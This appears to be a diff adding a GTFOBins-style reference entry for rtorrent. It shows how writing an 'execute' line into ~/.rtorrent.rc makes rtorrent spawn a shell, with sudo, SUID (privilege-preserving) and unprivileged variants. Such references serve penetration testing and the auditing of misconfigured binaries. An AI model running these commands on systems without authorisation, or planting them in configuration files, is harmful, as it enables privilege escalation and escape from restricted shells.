@@ -1,0 +1,20 @@
+rtorrent
+========
+
+Shell
+-----
+
+[Sudo]
+    echo 'execute = /bin/sh,-c,"/bin/sh </dev/tty >/dev/tty 2>/dev/tty"' >~/.rtorrent.rc
+rtorrent
+    After the shell, exit with `Ctrl-Q`.
+
+[SUID]
+    echo 'execute = /bin/sh,-p,-c,"/bin/sh -p </dev/tty >/dev/tty 2>/dev/tty"' >~/.rtorrent.rc
+rtorrent
+    After the shell, exit with `Ctrl-Q`.
+
+[Unprivileged]
+    echo 'execute = /bin/sh,-c,"/bin/sh </dev/tty >/dev/tty 2>/dev/tty"' >~/.rtorrent.rc
+rtorrent
+    After the shell, exit with `Ctrl-Q`.
